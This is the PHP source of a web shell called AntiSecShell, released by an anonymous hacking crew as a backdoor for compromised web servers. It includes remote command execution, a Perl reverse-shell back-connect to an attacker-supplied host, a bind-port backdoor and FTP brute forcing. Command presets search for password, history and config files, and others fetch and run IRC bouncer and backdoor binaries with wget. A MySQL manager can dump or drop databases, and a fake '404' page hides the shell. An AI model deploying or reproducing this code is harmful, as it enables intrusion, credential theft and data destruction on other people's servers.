<?php
/******************************************************************************************
*  AntiSecShell(ASS) v.0.5 PUBL1C RELEASE
*
*  c0d3 w45 5n1pp3d, r3bu1l7, 1mpr0v3d and 4dd3d by 4n7153c 5upp0r73rs 1nclud1ng
*  ac1db1tch3z, Antipeace, h0no 4nd 07h3rs wh0 w1sh 70 r3m4in 4n0nym0u5.
*
*  3nj0y 7h3 g1f7 fr0m 7h3 und3rgr0und, w3 supp0r7 y0u LulzSec, Anonymous 4nd 4ll 07h3r
*  4n71-s3c movement supp0r73rs!
*
*  5p3c14l fuck y0u 70:
*  kingcope 7h3 c0ckr04ch
*  muts s0n 0f 4 b17ch d035n'7 kn0w 4ny7h1ng, s3cur3 y0 sh17 h03
*  HD Moore f0r m4k1ng c0mm3rc14l msf, 7hx, fuck y0u
*  4ll wh173h47s
*  scr1p7 k1dd13s wh0 h4v3 n0 w1ll1ng 70 l34rn
*********************************************************/
$bn_nm = "QW50aVNlY1NoZWxsIChBU1MpIHYuMC41";
$sh_name = base64_decode($bn_nm);
$html_start = ''.
'<html><head>
...
a:visited { color:red; }
input,select,option { font:8pt tahoma;color:red;margin:2;border:1px solid #666666; }
textarea { color:red;font:fixedsys bold;border:1px solid #666666;margin:2; }
...
#pagebar a { font-weight:bold;color:red; }
#pagebar a:visited { color:red; }
...
.shell { background-color:black;color:#ed;padding:5px; }
...
textarea,.mainpanel input,select,option { background-color:black; }
// -->
</style>
</head>
<body>
...
$login = "";
$md5_pass = "";
// pu7 y0ur t0r'3d 1p h3r3 0r jus7 l34v3 17 l1k3 7h47
$ht_yes = array("*");
$login_txt = "404 - Not Found";
$accessdeniedmess = "<a href=\"$s_mu\">".$sh_name."</a>: access denied";
$gzipencode = TRUE;
$updatenow = FALSE;
$filestealth = TRUE;
$curdir = "./";
...
//func710n5, cr3d17s g0 70 0r1g1n4l 4u7h0r5
function get_phpini() {
  ...
  if (@function_exists('ini_get_all')) {
    $r = "";
    echo "<table><tr class=barheader><td>Directive</td><td>L0c4l V4lu3</td><td>Gl0b4l V4lu3</td></tr>";
...
function disp_drives($curdir,$surl) {
  ...
  foreach (range("A","Z") as $letter) {
    ...
    if ($bool) {
      $letters .= "<a href=\"".$surl."antisec=ls&d=".urlencode($letter.":\\")."\"".
      ($isdiskette?" onclick=\"return confirm('M4k3 sur3 7h47 7h3 d1sk3773 15 1ns3r73d pr0p3rly, 07h3rw1s3 4n 3rr0r m4y 0ccur.')\"":"")."> [";
...
if (!function_exists("s3x3c")) {
  if(is_callable("popen")) {
    function s3x3c($cmd) {
      if (!($po=popen("($cmd)2>&1","r"))) { return "popen D1s4bl3d!"; }
      while (!feof($po)) {
        $line=fgets($po,1024);
        $out .= $line;
      }
...
function ex($cf3) {
  ...
  if (!empty($cf3)) {
    if(function_exists('exec')) {
      ...
      $res = @ob_get_contents();
      @ob_end_clean();
    } elseif(@is_resource($f = @popen($cf3,"r"))) {
      $res = "";
      while(!@feof($f)) { $res .= @fread($f,1024); }
      @pclose($f);
    } else { $res = "Ex() D1s4bl3d!"; }
  }
  return $res;
}
function which($por) {
  $poath = ex("which $por");
  if(!empty($poath)) { return $poath; } else { return $por; }
}
...
if (!$win) {
  ...
  $itshome = str_replace("/public_html","/4n71s3c.php",$itshome);
}
else { $itshome = ""; }
...
$bc_p3rl = "";
...
$b4ckd00r = "";
...
function err() { $_POST['backcconnmsge']="<br><br><div class=fxerrmsg>Error:</div> C4n'7 c0nn3c7!"; }
function bberr() { $_POST['backcconnmsge']="<br><br><div class=fxerrmsg>Error:</div> C4n'7 b4ckd00r h057!"; }
...
if (!empty($_POST['backconnectip']) && !empty($_POST['backconnectport']) && ($_POST['use']=="Perl")) {
  if (is_writable(".")) {
    cf("back",$bc_p3rl);
    $po2 = which("perl");
    $blah = ex($po2." back ".$_POST['backconnectip']." ".$_POST['backconnectport']." &");
    if (file_exists("back")) { unlink("back"); }
  } else {
    cf("/tmp/back",$bc_p3rl);
    $po2 = which("perl");
    $blah = ex($po2." /tmp/back ".$_POST['backconnectip']." ".$_POST['backconnectport']." &");
...
define("starttime",gmt());
$not_enabled_feedback = $feedback;
...
if (!$win) {
  $cmdaliases = array(
    array("", "ls -al"),
    array("f1nd 4ll suid files", "f1nd / -type f -perm -04000 -ls"),
    array("f1nd suid files in current dir", "f1nd . -type f -perm -04000 -ls"),
    array("f1nd 4ll sgid files", "f1nd / -type f -perm -02000 -ls"),
    array("f1nd sgid files in current dir", "f1nd . -type f -perm -02000 -ls"),
    array("f1nd config.inc.php files", "f1nd / -type f -name config.inc.php"),
    array("f1nd config* files", "f1nd / -type f -name \"config*\""),
    array("f1nd config* files in current dir", "f1nd . -type f -name \"config*\""),
    array("f1nd 4ll writable folders and files", "f1nd / -perm -2 -ls"),
    array("f1nd 4ll writable folders and files in current dir", "f1nd . -perm -2 -ls"),
    array("f1nd 4ll writable folders", "f1nd / -type d -perm -2 -ls"),
    array("f1nd 4ll writable folders in current dir", "f1nd . -type d -perm -2 -ls"),
    array("f1nd 4ll service.pwd files", "f1nd / -type f -name service.pwd"),
    array("f1nd service.pwd files in current dir", "f1nd . -type f -name service.pwd"),
    array("f1nd 4ll .htpasswd files", "f1nd / -type f -name .htpasswd"),
    array("f1nd .htpasswd files in current dir", "f1nd . -type f -name .htpasswd"),
    array("f1nd 4ll .bash_history files", "f1nd / -type f -name .bash_history"),
    array("f1nd .bash_history files in current dir", "f1nd . -type f -name .bash_history"),
    array("f1nd 4ll .fetchmailrc files", "f1nd / -type f -name .fetchmailrc"),
    array("f1nd .fetchmailrc files in current dir", "f1nd . -type f -name .fetchmailrc"),
    array("List file attributes on a Linux second extended file system", "lsattr -va"),
    array("Show opened ports", "netstat -an | grep -i listen")
  );
  $cmdaliases2 = array(
    array("wget & extract psyBNC","wget ".$s_mu."fx.tar.gz;tar -zxf fx.tar.gz"),
    array("wget & extract EggDrop","wget ".$s_mu."fxb.tar.gz;tar -zxf fxb.tar.gz"),
    array("-----",""),
    array("Logged in users","w"),
    array("Last to connect","lastlog"),
    array("f1nd Suid bins","f1nd /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null"),
    array("User Without Password","cut -d: -f1,2,3 /etc/passwd | grep ::"),
    array("Can write in /etc/?","f1nd /etc/ -type f -perm -o+w 2> /dev/null"),
    ...
    array("wget & run BindDoor","wget ".$s_mu."toolz/bind.tar.gz;tar -zxvf bind.tar.gz;./4877"),
  ...
  $cmdaliases = array(
    array("", "dir"),
    array("f1nd index.php in current dir", "dir /s /w /b index.php"),
    array("f1nd *config*.php in current dir", "dir /s /w /b *config*.php"),
    array("f1nd ass5hell in current dir", "f1nd /c \"ass\" *"),
    array("f1nd r57shell in current dir", "f1nd /c \"r57\" *"),
...
$pohpfsaliases = array(
    ...
    array("f1nd Writable Dir", "fwritabledir"),
    array("f1nd Pathname Pattern", "glob"),
);

$quicklaunch1an = array(
    array("<img src=\"".$surl."antisec=img&img=home\" alt=\"Home\" border=\"0\">",$surl),
    array("<img src=\"".$surl."antisec=img&img=back\" alt=\"Back\" border=\"0\">","#\" onclick=\"history.back(1)"),
    array("<img src=\"".$surl."antisec=img&img=forward\" alt=\"Forward\" border=\"0\">","#\" onclick=\"history.go(1)"),
    array("<img src=\"".$surl."antisec=img&img=up\" alt=\"Up\" border=\"0\">",$surl."antisec=ls&d=%upd&sort=%sort"),
    array("<img src=\"".$surl."antisec=img&img=search\" alt=\"Search\" border=\"0\">",$surl."antisec=search&d=%d"),
    array("<img src=\"".$surl."antisec=img&img=buffer\" alt=\"Buffer\" border=\"0\">",$surl."antisec=fsbuff&d=%d")
);
$quicklaunch2an = array(
    array("3num3r473",$enumerate),
    array("53cur17y 1nf0",$surl."antisec=security&d=%d"),
    array("Pr0c35535",$surl."antisec=processes&d=%d"),
    array("MySQL",$surl."antisec=sql&d=%d"),
    array("PHP-C0d3",$surl."antisec=eval&d=%d"),
    array("3nc0d3r",$surl."antisec=encoder&d=%d"),
    array("M41l3r",$surl."antisec=fxmailer"),
    array("534rch 0n exploit-db",$millink),
    array("Md5-L00kup","http://darkc0de.com/database/md5lookup.html"),
    array("W0rd-L1575","http://darkc0de.com/wordlists/"),
    array("700ls",$surl."antisec=tools&d=%d"),
    array("k1ll m3",$surl."antisec=selfremove"),
);

if (!$win) {
$quicklaunch2an[] = array("<br>FTP-Bru73",$surl."antisec=ftpquickbrute&d=%d");
$quicklaunch2an[] = array("B4ckd00r",$surl."antisec=shbd");
$quicklaunch2an[] = array("B4ck-C0nn3c7",$surl."antisec=backc");
}
...
@$f = $_REQUEST["f"];
@extract($_REQUEST["asshc0k"]);
@set_time_limit(0);
$tmp = array();
foreach ($ht_yes as $k=>$v) { $tmp[] = str_replace("\\*",".*",preg_quote($v)); }
$s = "!^(".implode("|",$tmp).")$!i";
if (!preg_match($s,getenv("REMOTE_ADDR")) and !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR")))) {
  exit("<a href=\"$s_mu\">$sh_name</a>: Access Denied - Your host (".getenv("REMOTE_ADDR").") not allowed");
}
if (!empty($login)) {
  if (empty($md5_pass)) {$md5_pass = md5($poass);}
...
if ($antisec != "img") {
  ...
  if (!function_exists("assgetsource")) {
    function assgetsource($fn) {
      global $ass5h_sourcesurl;
      $array = array(
        "ass5h_bindport.pl" => "ass5h_bindport_pl.txt",
        "ass5h_bindport.c" => "ass5h_bindport_c.txt",
        "ass5h_backconn.pl" => "ass5h_backconn_pl.txt",
        "ass5h_backconn.c" => "ass5h_backconn_c.txt",
        "ass5h_datapipe.pl" => "ass5h_datapipe_pl.txt",
        "ass5h_datapipe.c" => "ass5h_datapipe_c.txt",
      );
      $name = $array[$fn];
      if ($name) {return file_get_contents($ass5h_sourcesurl.$name);}
      else {return FALSE;}
    }
  }
  if (!function_exists("ass_buff_prepare")) {
    function ass_buff_prepare() {
      global $sess_data;
      global $antisec;
      ...
      sort($sess_data["copy"]);
      sort($sess_data["cut"]);
      if ($antisec != "copy") {foreach($sess_data["cut"] as $k=>$v) {if ($sess_data["copy"][$k] == $v) {unset($sess_data["copy"][$k]); }}}
      else {foreach($sess_data["copy"] as $k=>$v) {if ($sess_data["cut"][$k] == $v) {unset($sess_data["cut"][$k]);}}}
    }
  }
  ass_buff_prepare();
  if (!function_exists("ass_sess_put")) {
    function ass_sess_put($data) {
      global $sess_cookie;
      global $sess_data;
      ass_buff_prepare();
      $sess_data = $data;
  ...
  if (!function_exists("ass_copy_dir")) {
    function ass_copy_dir($d,$t) {
      ...
      while (($o = readdir($h)) !== FALSE) {
        if (($o != ".") and ($o != "..")) {
          ...
          else {$ret = mkdir($t.DIRECTORY_SEPARATOR.$o); ass_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
          if (!$ret) {return $ret;}
        }
      }
      closedir($h);
  ...
  if (!function_exists("ass_copy_obj")) {
    function ass_copy_obj($d,$t) {
      $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
      ...
      if (is_dir($d)) {
        ...
        return ass_copy_dir($d,$t);
      }
      elseif (is_file($d)) { return copy($d,$t); }
      else { return FALSE; }
    }
  }
  if (!function_exists("ass_move_dir")) {
    function ass_move_dir($d,$t) {
      $h = opendir($d);
      if (!is_dir($t)) {mkdir($t);}
      while (($o = readdir($h)) !== FALSE) {
        if (($o != ".") and ($o != "..")) {
          $ret = TRUE;
          if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
          else {if (mkdir($t.DIRECTORY_SEPARATOR.$o) and ass_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o)) {$ret = FALSE;}}
          if (!$ret) {return $ret;}
        }
      }
      closedir($h);
  ...
  if (!function_exists("ass_move_obj")) {
    function ass_move_obj($d,$t) {
      $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
      $t = str_replace("\\",DIRECTORY_SEPARATOR,$t);
      if (is_dir($d)) {
        if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
        if (substr($t,-1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}
        return ass_move_dir($d,$t);
      }
      elseif (is_file($d)) {
  ...
  if (!function_exists("ass_rmdir")) {
    function ass_rmdir($d) {
      $h = opendir($d);
      while (($o = readdir($h)) !== FALSE) {
        if (($o != ".") and ($o != "..")) {
          if (!is_dir($d.$o)) {unlink($d.$o);}
          else {ass_rmdir($d.$o.DIRECTORY_SEPARATOR); rmdir($d.$o);}
        }
      }
      closedir($h);
      rmdir($d);
  ...
  if (!function_exists("ass_rmobj")) {
    function ass_rmobj($o) {
  ...
  if (!function_exists("v13w_p3rm5")) {
    function v13w_p3rm5($mode) {
  ...
  if (!function_exists("v13w_p3rm5_color")) {
    function v13w_p3rm5_color($o) {
      if (!is_readable($o)) {return "<font color=red>".v13w_p3rm5(fileperms($o))."</font>";}
      elseif (!is_writable($o)) {return "<font color=white>".v13w_p3rm5(fileperms($o))."</font>";}
      else {return "<font color=green>".v13w_p3rm5(fileperms($o))."</font>";}
    }
  }
  if (!function_exists("mysql_dump")) {
    function mysql_dump($set) {
      ...
      if (empty($db)) {$db = "db";}
      if (empty($porint)) {$porint = 0;}
      if (empty($annl2br)) {$annl2br = 0;}
      ...
      # AntiSecShell - ASS
      # H057 53771ng5:
      # MySQL v3rs10n: (".mysql_get_server_info().") running on ".getenv("SERVER_ADDR")." (".getenv("SERVER_NAME").")"."
      # D473: ".date("d.m.Y H:i:s")."
      # DB: \"".$db."\"
      #------------------ASS---------------ASS------------------------";
      $c = count($onlytabs);
      foreach($tabs as $tab) {
      ...
      if ($porint) {if ($annl2br) {echo nl2br($out);} else {echo $out;}}
      return $out;
    }
  }
  ...
  if (!function_exists("mysql_query_form")) {
    function mysql_query_form() {
      global $submit,$sql_antisec,$sql_query,$sql_query_result,$sql_confirm,$sql_query_error,$tbl_struct;
      if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}
      if ($sql_query_result or (!$sql_confirm)) {$sql_antisec = $sql_goto;}
      if ((!$submit) or ($sql_antisec)) {
        echo "<table border=0><tr><td><form name=\"ass5h_sqlquery\" method=POST><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to";} else {echo "SQL-Query";} echo ":</b><br><br><textarea name=sql_query cols=100 rows=10>".htmlspecialchars($sql_query)."</textarea><br><br><input type=hidden name=antisec value=sql><input type=hidden name=sql_antisec value=query><input type=hidden name=sql_tbl value=\"".htmlspecialchars($sql_tbl)."\"><input type=hidden name=submit value=\"1\"><input type=hidden name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=submit name=sql_confirm value=\"Yes\"> <input type=submit value=\"No\"></form></td>";
        if ($tbl_struct) {
          echo "<td valign=\"top\"><b>Fields:</b><br>";
          foreach ($tbl_struct as $field) {$name = $field["Field"]; echo "+ <a href=\"#\" onclick=\"document.ass5h_sqlquery.sql_query.value+='`".$name."`';\"><b>".$name."</b></a><br>";}
          echo "</td></tr></table>";
        }
      }
  ...
  if (!function_exists("assfsearch")) {
    function assfsearch($d) {
      global $found;
      global $found_d;
      global $found_f;
      global $search_i_f;
  ...
  if ($antisec == "gofile") {
    if (is_dir($f)) { $antisec = "ls"; $d = $f; }
    else { $antisec = "f"; $d = dirname($f); $f = basename($f); }
  }
  @ob_start();
  @ob_implicit_flush(0);
  ...
  function showdisablefunctions() {
    ...
    else { return "<font color=red><b>NONE</b></b></font>"; }
  }
  if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") {
    $safemode = TRUE;
    $hsafemode = "<font color=red><b>54F3 M0D3 15 0N (53cur3)</b></font>";
  }
  else {
    $safemode = FALSE;
    $hsafemode = "<font color=green><b>54F3 M0D3 15 0FF (N07 53cur3)</b></font>";
  }
  ...
  if ($v or strtolower($v) == "on") {
    ...
    $openbasedir = FALSE;
    $hopenbasedir = "<font color=green>OFF (n07 53cur3)</font>";
  }
  ...
  $DISP_SERVER_SOFTWARE = str_replace("PHP/".phpversion(),"<a href=\"".$surl."antisec=phpinfo\" target=\"_blank\"><b><u>PHP/".phpversion()."</u></b></a>",htmlspecialchars($DISP_SERVER_SOFTWARE));
  ...
  if (!is_array($antisecbox)) { $antisecbox = array(); }
  $dsantisec = $antisec = htmlspecialchars($antisec);
...
echo $html_start;
echo "<div class=barheader2><h3>$sh_name</h3>| pr0j3c7 m4yh3m | 4n71-s3c m0v3m3n7 | fuck wh173h475 |</div>\n";
echo "<table id=pagebar><tr><td width=50%><p>".
     "50f7w4r3 : ".$DISP_SERVER_SOFTWARE ." - <a href=".$surl."antisec=phpini>php.ini</a><br>".
     "$hsafemode<br>".
     "OS : ".php_uname()."<br>";
if (!$win) { echo "Us3r 1D : ".s3x3c("id"); }
else { echo "User : " . get_current_user(); }
echo "</p></td>".
     "<td width=50%><p>53rv3r 1P : <a href=http://whois.domaintools.com/".gethostbyname($_SERVER["HTTP_HOST"]).">".gethostbyname($_SERVER["HTTP_HOST"])."</a> - ".
     "Y0ur 1P - h1d3 17 v14 t0r n37w0rk : <a href=http://whois.domaintools.com/".$_SERVER["REMOTE_ADDR"].">".$_SERVER["REMOTE_ADDR"]."</a><br>";
if($win){echo "Dr1v3s : ".disp_drives($d,$surl)."<br>";}
...
if (count($quicklaunch1an) > 0) {
  foreach($quicklaunch1an as $item) {
    $item[1] = str_replace("%d",urlencode($d),$item[1]);
    $item[1] = str_replace("%sort",$sort,$item[1]);
    $v = realpath($d."..");
    if (empty($v)) {
...
echo "<p class=fleft>";
$pod = $e = explode(DIRECTORY_SEPARATOR,substr($d,0,-1));
$i = 0;
foreach($pod as $b) {
  $t = ""; $j = 0;
  ...
  echo "<a href=\"".$surl."antisec=ls&d=".urlencode($t)."&sort=".$sort."\"><font color=red>".htmlspecialchars($b).DIRECTORY_SEPARATOR."</font></a>";
  $i++;
}
echo " - ";
if (is_writable($d)) {
  ...
  echo "<b><font color=green>".v13w_p3rm5(fileperms($d))."</font></b>";
}
else {
  $wd = FALSE;
  $wdt = "<font color=red>[Read-Only]</font>";
  echo "<b>".v13w_p3rm5_color($d)."</b>";
}
?>
</p>
<div class=fright>
<form method="POST"><input type=hidden name=antisec value="ls">
...
if ($antisec == "") { $antisec = $dsantisec = "ls"; }
if ($antisec == "phpini" ) { get_phpini(); }
if ($antisec == "sql") {
  $sql_surl = $surl."antisec=sql";
  ...
  if (!$sql_sock) {
    ...
    $sqlquicklaunch[] = array("Index",$surl."antisec=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&");
    $sqlquicklaunch[] = array("Query",$sql_surl."sql_antisec=query&sql_tbl=".urlencode($sql_tbl));
    $sqlquicklaunch[] = array("Server-status",$surl."antisec=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_antisec=serverstatus");
    $sqlquicklaunch[] = array("Server variables",$surl."antisec=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_antisec=servervars");
    $sqlquicklaunch[] = array("Processes",$surl."antisec=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_antisec=processes");
    $sqlquicklaunch[] = array("Logout",$surl."antisec=sql");
  ...
  if (!$sql_sock) {
    ...
    echo "<table width=\"100%\" border=0><tr><td><b>Please, fill the form:</b><table><tr><td><b>Username</b></td><td><b>Password</b></td><td><b>Database</b></td></tr><form action=\" $surl \" method=\"POST\"><input type=\"hidden\" name=\"antisec\" value=\"sql\"><tr><td><input type=\"text\" name=\"sql_login\" value=\"root\" maxlength=\"64\"></td><td><input type=\"password\" name=\"sql_passwd\" value=\"\" maxlength=\"64\"></td><td><input type=\"text\" name=\"sql_db\" value=\"\" maxlength=\"64\"></td></tr><tr><td><b>Host</b></td><td><b>PORT</b></td></tr><tr><td align=right><input type=\"text\" name=\"sql_server\" value=\"localhost\" maxlength=\"64\"></td><td><input type=\"text\" name=\"sql_port\" value=\"3306\" maxlength=\"6\" size=\"3\"></td><td><input type=\"submit\" value=\"Connect\"></td></tr><tr><td></td></tr></form></table></td>";
  }
  else {
    if (!empty($sql_db)) {
      ?><td width="25%" height="100%" valign="top"><a href="<?php echo $surl."antisec=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&"; ?>"><b>Home</b></a><hr size="1" noshade>
      <?php
    ...
    if ($sql_db) {
      ...
      echo "</b></center>";
      $antisecs = array("","dump");
      if ($sql_antisec == "tbldrop") {$sql_query = "DROP TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_antisec = "query";}
      elseif ($sql_antisec == "tblempty") {$sql_query = ""; foreach($boxtbl as $v) {$sql_query .= "DELETE FROM `".$v."` \n";} $sql_antisec = "query";}
      elseif ($sql_antisec == "tbldump") {if (count($boxtbl) > 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl);} $sql_antisec = "dump";}
      elseif ($sql_antisec == "tblcheck") {$sql_query = "CHECK TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_antisec = "query";}
      elseif ($sql_antisec == "tbloptimize") {$sql_query = "OPTIMIZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_antisec = "query";}
      elseif ($sql_antisec == "tblrepair") {$sql_query = "REPAIR TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_antisec = "query";}
      elseif ($sql_antisec == "tblanalyze") {$sql_query = "ANALYZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_antisec = "query";}
      elseif ($sql_antisec == "deleterow") {$sql_query = ""; if (!empty($boxrow_all)) {$sql_query = "DELETE * FROM `".$sql_tbl."`;";} else {foreach($boxrow as $v) {$sql_query .= "DELETE * FROM `".$sql_tbl."` WHERE".$v." LIMIT 1;\n";} $sql_query = substr($sql_query,0,-1);} $sql_antisec = "query";}
      elseif ($sql_tbl_antisec == "insert") {
      ...
      if ($sql_antisec == "query") {
        echo "<hr size=\"1\" noshade>";
        if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}
        if ($sql_query_result or (!$sql_confirm)) {$sql_antisec = $sql_goto;}
        if ((!$submit) or ($sql_antisec)) {echo "<table border=\"0\" width=\"100%\" height=\"1\"><tr><td><form action=\"".$sql_surl."\" method=\"POST\"><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to:";} else {echo "SQL-Query :";} echo "</b><br><br><textarea name=\"sql_query\" cols=\"100\" rows=\"10\">".htmlspecialchars($sql_query)."</textarea><br><br><input type=\"hidden\" name=\"sql_antisec\" value=\"query\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"submit\" value=\"1\"><input type=\"hidden\" name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=\"submit\" name=\"sql_confirm\" value=\"Yes\"> <input type=\"submit\" value=\"No\"></form></td></tr></table>";}
      }
      if (in_array($sql_antisec,$antisecs)) {
        ...
        <input type="hidden" name="antisec" value="sql">
        <input type="hidden" name="sql_antisec" value="newtbl">
        ...
        <form action="<?php echo $surl; ?>">
        <input type="hidden" name="antisec" value="sql">
        <input type="hidden" name="sql_antisec" value="dump">
        <input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>">
        <input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>">
        <input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>">
        ...
        <?php
        if (!empty($sql_antisec)) {echo "<hr size=\"1\" noshade>";}
        if ($sql_antisec == "newtbl") {
          echo "<b>";
        ...
        if ($diplay) {
    if (!empty($sql_tbl)) {
      if (empty($sql_tbl_antisec)) {$sql_tbl_antisec = "browse";}
      ...
      if ($sql_ls > $sql_le) {$sql_le = $sql_ls + $poerpage;}
      if (empty($sql_tbl_page)) {$sql_tbl_page = 0;}
      if (empty($sql_tbl_ls)) {$sql_tbl_ls = 0;}
      if (empty($sql_tbl_le)) {$sql_tbl_le = 30;}
      $poerpage = $sql_tbl_le - $sql_tbl_ls;
      if (!is_numeric($poerpage)) {$poerpage = 10;}
      $numpages = $count_row[0]/$poerpage;
      $e = explode(" ",$sql_order);
      if (count($e) == 2) {
      ...
      $query = "SELECT * FROM `".$sql_tbl."` ".$v."LIMIT ".$sql_tbl_ls." , ".$poerpage."";
      $result = mysql_query($query) or print(mysql_smarterror());
      echo "<hr size=\"1\" noshade><center><b>Table ".htmlspecialchars($sql_tbl)." (".mysql_num_fields($result)." cols and ".$count_row[0]." rows)</b></center>";
      echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_antisec=structure\">[<b> Structure </b>]</a>&nbsp;&nbsp;&nbsp;";
      echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_antisec=browse\">[<b> Browse </b>]</a>&nbsp;&nbsp;&nbsp;";
      echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_antisec=tbldump&thistbl=1\">[<b> Dump </b>]</a>&nbsp;&nbsp;&nbsp;";
      echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_antisec=insert\">[&nbsp;<b>Insert</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
      if ($sql_tbl_antisec == "structure") {echo "<br><br><b>Coming sooon!</b>";}
      if ($sql_tbl_antisec == "insert") {
      ...
      if ($sql_tbl_antisec == "browse") {
        $sql_tbl_ls = abs($sql_tbl_ls);
        $sql_tbl_le = abs($sql_tbl_le);
        echo "<hr size=\"1\" noshade>";
        echo "<img src=\"".$surl."antisec=img&img=multipage\" height=\"12\" width=\"10\" alt=\"Pages\">&nbsp;";
        $b = 0;
        for($i=0;$i<$numpages;$i++) {
          if (($i*$poerpage != $sql_tbl_ls) or ($i*$poerpage+$poerpage != $sql_tbl_le)) {echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_order=".htmlspecialchars($sql_order)."&sql_tbl_ls=".($i*$poerpage)."&sql_tbl_le=".($i*$poerpage+$poerpage)."\"><u>";}
          echo $i;
          if (($i*$poerpage != $sql_tbl_ls) or ($i*$poerpage+$poerpage != $sql_tbl_le)) {echo "</u></a>";}
        ...
        for ($i=0;$i<mysql_num_fields($result);$i++) {
          ...
          else {echo "<b>".$v."</b><a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$s."%20".$v."\"><img src=\"".$surl."antisec=img&img=sort_".$m."\" height=\"9\" width=\"14\" alt=\"".$m."\"></a>";}
          echo "</td>";
        }
      ...
      while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
       ...
       echo "<td>";
       echo "<a href=\"".$sql_surl."sql_antisec=query&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_query=".urlencode("DELETE FROM `".$sql_tbl."` WHERE".$w." LIMIT 1;")."\"><img src=\"".$surl."antisec=img&img=sql_button_drop\" alt=\"Delete\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;";
       echo "<a href=\"".$sql_surl."sql_tbl_antisec=insert&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_insert_q=".urlencode($w)."\"><img src=\"".$surl."antisec=img&img=change\" alt=\"Edit\" height=\"14\" width=\"14\" border=\"0\"></a>&nbsp;";
       echo "</td>";
       echo "</tr>";
      }
      mysql_free_result($result);
      echo "</table><hr size=\"1\" noshade><p align=\"left\"><img src=\"".$surl."antisec=img&img=arrow_ltr\" border=\"0\"><select name=\"sql_antisec\">";
     ...
     else
     {
      ...
      while ($row = mysql_fetch_array($result, MYSQL_ASSOC))
      {
       ...
       echo "<td>".$size."</td>";
